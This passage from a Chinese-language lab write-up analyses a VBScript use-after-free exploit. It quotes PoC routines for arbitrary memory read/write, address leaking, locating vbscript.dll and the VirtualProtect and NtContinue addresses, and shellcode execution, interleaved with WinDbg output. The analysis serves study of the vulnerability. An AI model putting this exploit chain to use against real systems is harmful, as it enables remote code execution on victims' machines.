    005b34d4  88000000 00000008 006c0063 00350061
    005b34e4  00650000 00000072 00000000 00000000
    005b34f4  00000000 67e6a977 8c000000 00000001
    005b3504  00000000 00000000 7fffffff 7fffffff
    005b3514  80000001 80000001 00000000 67e6a94c
    005b3524  88000000 00000000 00000000 0075006f
在Get P 执行完成后，P作为返回值返回给cla4.mem成员变量中，我们再来看一下P：
//源码中;
P=174088534690791e-324 //优化后这样的：
P=CDbl(“174088534690791e-324”) //CDbl是vbs中把表达式转化为双精度类型的一个函数
174088534690791 e-324 是174088534690791的-324平方
用c语言计算为:printf(“%I64x\n”,174088534690791e-324);
为，200c00000000,
由它是vbDouble类型，前面会有一个0x05的标志，
最终在内存中P的值为：00000005 00000000 00000000 0000200C
这样就把0x08改为了0x200c。
调试看一下：
    vbscript!VbsIsEmpty:
    6f39c206 8bff       mov   edi,edi
    0:005> dd 024da82c
    024da82c  0000200c 024d87dc 005b34b4 00000000
    024da83c  00000000 00000000 0000822f 00000006
    024da84c  00000000 00000000 00000003 000005f8
    024da85c  0065006d 0000006d 024da838 00000012
    024da86c  00000000 000005d0 000005f8 00000000
    024da87c  024da7b4 024da84c 0000002b 00000000
    024da88c  000005cb 0000060b 00000000 024da718
    024da89c  024da914 00000002 00000000 000005fa
    0:005> dd 024da82c-c
    024da820  024c0005 024cbf68 00000000 0000200c
    024da830  024d87dc 005b34b4 00000000 00000000
    024da840  00000000 0000822f 00000006 00000000
    024da850  00000000 00000003 000005f8 0065006d
    024da860  0000006d 024da838 00000012 00000000
    024da870  000005d0 000005f8 00000000 024da7b4
    024da880  024da84c 0000002b 00000000 000005cb
    024da890  0000060b 00000000 024da718 024da914
//为什么是从mem地址-c开始的，，这个-c的位置，是原来没有被释放的时候的cla4_obj1.mem的地址，//就是P修改的是释放前的mem的地址，释放前与占位后的mem相差0x0C字节，//00000005
00000000 00000000 0000200C这个数，刚好从0c的位置写入了0x200c
最终实现了
vbstring—>safearray的类型转换，cla5.mem最终拿到任意地址读写权限，在InitObjects函数中的cla4_obj2.SetProp(cla7_obj1)使用了同样的方法，这里就不一一调试了。最后还有泄露字符串指针的关键代码：
//源码
Alert “InitObjects2”
spec_int_1=cla4_obj2.mem ‘这句将上面指向0000的那个字符串的指针泄露给了spec_int_1
IsEmpty(spec_int_1)
其实在上面就已经利用vbscript的漏洞实现了全地址读写，下面就是利用上面产生的对象实行PoC地址的泄露以及shellcode的构造和执行。
先来对PoC中的地址进行泄露：
//此函数泄露 CScriptEntryPoint 对象的虚函数表地址，该地址属于Vbscript.dll。
    Function LeakVBAddr
      On Error Resume Next    '忽略错误，执行下一条代码
      Dim emptySub_addr_placeholder   '构造一个类型为null 的 CScriptEntryPoint 对象
      emptySub_addr_placeholder=EmptySub
      emptySub_addr_placeholder=null
      IsEmpty(emptySub_addr_placeholder)  '此断点可以查看此 CScriptEntryPointObject 地址
      SetMemValue emptySub_addr_placeholder  '这种传参数不用括号也是可以的
      LeakVBAddr=GetMemValue()
    End Function
这个时候也可以在LeakVBAddr函数中IsEmpty的断点查看emptySub_addr_placeholder：
    0:005> dd poi(esp+c)
    0055fe58  00000001 000007ff 0055e030 cf0000cf  //这个对象地址下一步会保存在指向空字符串+8的地方
    0055fe68  00000001 000007ff 0055e030 cf0000cf
    0055fe78  00000000 00000000 02021598 00000000
    0055fe88  024bd3d8 0055fea8 020217a0 00000000
    0:005> ln poi(0055e030)              //发现它是一个CScriptEntryPoint对象，
    (6a5b4934)  vbscript!CScriptEntryPoint::`vftable'  |  (6a5cab54)  vbscript!CEntryPointDispatch::`vftable'
    Exact matches:
      vbscript!CScriptEntryPoint::`vftable` = 
我们再来看一下代码是如何产生一个CScriptEntryPoint对象的：
    On  Error Resume  Next              //首先它定义了忽略错误
    Dim emptySub_addr_placeholder               //定义一个变量
    emptySub_addr_placeholder =EmptySub       //将函数指针赋值给一个变量，VBS语法是不允许这样的，但是其上面忽略了错误，最终这个函数指针的值仍然被赋值给了变量
    emptySub_addr_placeholder=null         //然后将该值的类型设置为null，最终，变量里面仍然保存着一个函数指针，但是类型为null
    进入SetMemValue函数，要记住上面在InitObjects函数的最后spec_int_1中保存的就是那个0字符串的地址：
    //源码
    Sub SetMemValue(ByRef Ili)
      cla4_obj1.mem(spec_int_1+8)=Ili  '将CScriptEntryPoint对象放到spec_int_1+8的位置
    IsEmpty("SetMemValue Finish")   
    End Sub
    对于这样的修改是因为cla4_obj1.mem已经是一个可以全地址读写的array了，这里一样通过IsEmpty进行下断：
    //调试
    Breakpoint 3 hit
    eax=6a5b185c ebx=024bcea0 ecx=6a60a9d8 edx=024bce18 esi=02016a68 edi=00000001
    eip=6a5cc206 esp=024bcd34 ebp=024bcd44 iopl=0     nv up ei pl zr na pe nc
    cs=001b  ss=0023 ds=0023 es=0023 fs=003b  gs=0000       efl=00000246
    vbscript!VbsIsEmpty:6a5cc206 8bff       mov   edi,edi
    //这个地址就是上面的指向空字符的地址：
    0:005> dd 003f9dd4003f9dd4  00000000 00000000 00000001 000007ff  //从+8的位置保存的便是CScriptEntryPoint对象,这个0x01是vbNull(可查询上方表格)
    003f9de4  0055e030 cf0000cf 003f93a4 4b92935b
    003f9df4  8c000000 00000001 00000000 00000000
    003f9e04  7fffffff 7fffffff 80000001 80000001
    003f9e14  00000000 4b929326 88000000 00000000
    003f9e24  006e0000 00740069 0062004f 0065006a
    003f9e34  00740063 00000073 003f9e4c 4b92932d
    003f9e44  88000000 00000018 006e0049 00740069
    之后就是进入GetMemValue函数：
    //源码Function GetMemValue
      cla4_obj1.mem(spec_int_1)= 3  '将CScriptEntryPoint对象 的类型改为3 即为Long
      IsEmpty("GetMemValue Finish")
      GetMemValue=cla4_obj1.mem(spec_int_1+ 8)End Function
整个过程的效果就是在GetMemValue=cla4_obj1.mem(spec_int_1+
8)这一步把0055e030的值给了GetMemValue，GetMemValue赋值给了LeakVBAddr
，以上整个LeakVBAddr函数过程得到了vbLong型的CScriptEntryPoint对象地址。
接下来的一些过程其实也是一些关键地址的获取，这里重点通过原始POC分析代码的运行逻辑，先来讲一下PoC中的GetUint32函数：
//函数参数为对象地址，然后该函数返回的是这个对象的虚函数表地址
    Function GetUint32(addr)   
      Dim value
     IsEmpty("enter GetUint32")
      cla4_obj1.mem(spec_int_1+8)=addr+4  '原本存放CScriptEntryPoint对象的位置 存放 该对象地址+4
     IsEmpty("spec_int_1+8")
      cla4_obj1.mem(spec_int_1)=8     '改为字符串 type string
     IsEmpty("type string")
      value=cla4_obj1.P0123456789
     IsEmpty(value)
      cla4_obj1.mem(spec_int_1)=2  '改为 整型 type vbInteger
     IsEmpty("type vbInteger")
    GetUint32=value   
    End Function
从之前我们已经分析过了Class
cla5，那么我们就可以知道value=cla4_obj1.P0123456789这一步最终返回的是CScriptEntryPoint类对象的虚函数表地址。整个函数就是为了得到VBScript.dll中的CScriptEntryPoint对象虚函数表。
再来看获取VBScript.dll基地址的函数：
    Function FindMzBase(vtable_address)
      Dim base
      base=vtable_address And &hffff0000  '64k对齐，得到vbscript.dll 基地址
     Alert "FindMzBase "
     IsEmpty(base)
      Do While GetUint32(base+&h68)<>&h206E6920 Or GetUint32(base+&h6c)<>&h20534F44
        base=base-&h10000   
      Loop
     IsEmpty(base)
    FindMzBase=base
    End Function
最后就是获取其余的dll以及函数地址：
VBScript.dll导入了msvcrt.dll，msvcrt.dll又导入了kernelbase.dll与ntdll.dll，遍历它们的导入表最终可以从kernelbase.dll中获取到VirtualProtect函数地址，从ntdll.dll中获取NtContinue函数地址，具体的来看一下POC：
    '首先得到VBScript地址，其传入的是CScriptEntryPoint虚函数表对象地址
      vbs_base=FindMzBase(GetUint32(vb_adrr))
      Alert "VBScript Base: 0x" & Hex(vbs_base) 
      '遍历VBScript.dll导入表找到msvcrt.dll基地址
      msv_base=GetBaseFromImport(vbs_base,"msvcrt.dll")
      Alert "MSVCRT Base: 0x" & Hex(msv_base) 
       '遍历msvcrt.dll导入表找到kernelbase.dll基地址
      krb_base=GetBaseFromImport(msv_base,"kernelbase.dll")
      Alert "KernelBase Base: 0x" & Hex(krb_base) 
       '遍历msvcrt.dll导入表找到ntdll.dll基地址
      ntd_base=GetBaseFromImport(msv_base,"ntdll.dll")
      Alert "Ntdll Base: 0x" & Hex(ntd_base) 
       '从kernelbase.dll找到VirtualProtect函数地址
      VirtualProtectAddr=GetProcAddr(krb_base,"VirtualProtect")
      Alert "KernelBase!VirtualProtect Address 0x" & Hex(VirtualProtectAddr) 
       '从ntdll.dll找到 NtContinue 函数地址
      NtContinueAddr=GetProcAddr(ntd_base,"NtContinue")
      Alert "Ntdll!NtContinue Address 0x" & Hex(NtContinueAddr)
    最后就通过以下代码返回Shellcode地址：
    //PoC源码
    SetMemValue GetShellcode()
    ShellcodeAddr=GetMemValue()+8
    IsEmpty(ShellcodeAddr)
最后进行一个总结的话就是从取得全地址读写权限以后，进行的构造是从 VAR::Clear 中调用了 ntdll!ntContinue，而且又仿造好了一个了
CONTEXT结构体，这样利用 ntdll!ntContinue还原了一个假的进程。且 eip 就是
VirtualProtect,而栈空间esp是前面准备好的，返回值为shellcode入口，VirtualProtect的执行参数也是shellcode区域，最后VirtualProtect函数执行完，直接返回到shellcode的开始处开始执行。
## 五、 实验结果
这次实验最终的结果首先就是对于漏洞产生进行的一个验证，然后就是通过POC进行一个计算器的弹出：
## 六、 问题与感悟
在调试、复现漏洞的过程中遇到的第一个问题就是windbg的配置问题，其中主要是由于symbol无法正常匹配所产生的问题，而无法正常读取符号表的问题也就是symbol相对应的网络链接被墙了，导致无法访问，最后的解决方法也就是通过下载离线的符号表进行本地调用。之后存在的第二个问题的话就是在我们之前调试POC实现全地址读写中有一个关键点就是在最后使用myclass1占位空间时，vbs引擎并未清理掉之前myclass２的成员变量mem，而该变量地址刚好与myclass1.mem相差0xC，以至于后续可以实现类型混淆构造出任意地址访问的数组结构。之后通过调试可以理解到类结构解析过程中各成员的初始化顺序以及VBS中特有的默认属性构造函数default
property get function的执行逻辑。这个时候再回过头来看一下之前提到过的一个数据结构：
按照上述结构可以根据类对象0x30的结构解析出对象中各成员（成员函数和成员变量）的具体位置。动态验证过程中不难发现在实际成员初始化的过程中，各成员会以VARIANT的形式按照既定的初始化顺序存储在一段连续的内存空间中。这里我们就可以知道类成员的内存分配，根据所有成员按需且遵循前面提到的初始化顺序申请一块连续的内存空间，各成员VVAL1，VVAL2，VVAL3…均以一个0x10的VARIANT结构呈现，相邻成员变量之间偏移等于一个固定的内存空间0x32+前一个成员名称（UNICODE字符串）的长度。
最后的话就来一个综合的理解：
1、初始占位内存的地址为0x0235f4bc、即类对象第一个初始化的成员变量的VARIANT结构地址。  
2、用myclass2占位时，myclass2.mem的VARIANT地址= 0x0235f4bc + 0x32 +len(“p”) +0x32 +
len(“setprop”) = 0x0235f530。  
其VARIANT结构：00000008 00000000 002aa5e4 00000000。
3、用myclass1占位前，myclass1.mem的VARIANT地址= 0x0235f4bc + 0x32 +len(“p0123456789”)
+0x32 + len(“p01”) = 0x0235f53c。  
其VARIANT结构：00000008 00000000 002aa5e4 00000000。
4、调用myclass2.setprop(myconf)，myconf类的default property get
p将浮点数174088534690791e-324（内存结构为：00000005 000005dd 00000000
0000200c）赋给myclass2.mem。由于myclass1.mem与myclass2.mem的VARIANT结构偏移0xc，将会覆盖上一步中的“0008”为“200c”，如下图所示。
通过逆向分析、调试以及复现这个cve，我感觉自己又丰富了一些新的知识，之前很多知识都是一知半解，不是很能理解写相应脚本的思路是什么，这次实实在在的通过静态分析和动态分析相结合的方式，可以说是比较完整地理解了这个cve以及相关的利用代码了，收获颇大。